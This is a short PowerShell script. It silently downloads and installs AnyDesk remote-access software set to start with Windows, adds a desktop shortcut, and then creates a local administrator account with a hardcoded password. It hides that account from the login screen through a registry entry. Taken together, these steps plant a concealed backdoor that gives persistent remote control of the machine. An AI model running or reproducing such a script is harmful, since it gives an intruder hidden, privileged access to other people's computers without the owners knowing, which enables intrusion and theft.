# Must be run as Administrator

# ----------------- CONFIG -----------------
$anydeskUrl = "http://download.anydesk.com/AnyDesk.exe"
$adminUsername = "oldadministrator"
$adminPassword = "jsbehsid#Zyw4E3"
# -----------------------------------------

function Ensure-Admin {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "❌ Please run this script as Administrator." -ForegroundColor Red
        exit
    }
}

function Get-DesktopPath {
    return [Environment]::GetFolderPath("Desktop")
}

function Install-AnyDesk {
    $desktopPath = Get-DesktopPath
    $installPath = Join-Path $desktopPath "AnyDesk"
    $anydeskExe = Join-Path $installPath "AnyDesk.exe"

    Write-Host "`n📦 Installing AnyDesk to: $installPath" -ForegroundColor Cyan

    if (-not (Test-Path $installPath)) {
        New-Item -ItemType Directory -Path $installPath | Out-Null
    }

    Write-Host "⏬ Downloading AnyDesk..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskExe

    Write-Host "🚀 Installing AnyDesk silently..." -ForegroundColor Yellow
    Start-Process -FilePath $anydeskExe -ArgumentList "--install `"$installPath`" --start-with-win --silent" -Wait

    Write-Host "✅ AnyDesk installed." -ForegroundColor Green

    Create-Shortcut -exePath "$installPath\AnyDesk.exe" -shortcutPath "$desktopPath\AnyDesk.lnk"
}

function Create-Shortcut {
    param (
        [string]$exePath,
        [string]$shortcutPath
    )

    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = $exePath
    $Shortcut.IconLocation = "$exePath,0"
    $Shortcut.Save()

    Write-Host "🔗 Shortcut created on Desktop." -ForegroundColor Green
}

function Create-HiddenAdmin {
    Write-Host "`n👤 Creating hidden admin user..." -ForegroundColor Cyan

    net user $adminUsername $adminPassword /add
    net localgroup Administrators $adminUsername /add

    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    New-ItemProperty -Path $regPath -Name $adminUsername -PropertyType DWord -Value 0 -Force | Out-Null

    Write-Host "✅ Hidden admin user '$adminUsername' created." -ForegroundColor Green
}

# ------------------ EXECUTION ------------------
Ensure-Admin
Install-AnyDesk
Create-HiddenAdmin

Write-Host "`n🎉 All tasks completed successfully!" -ForegroundColor Green
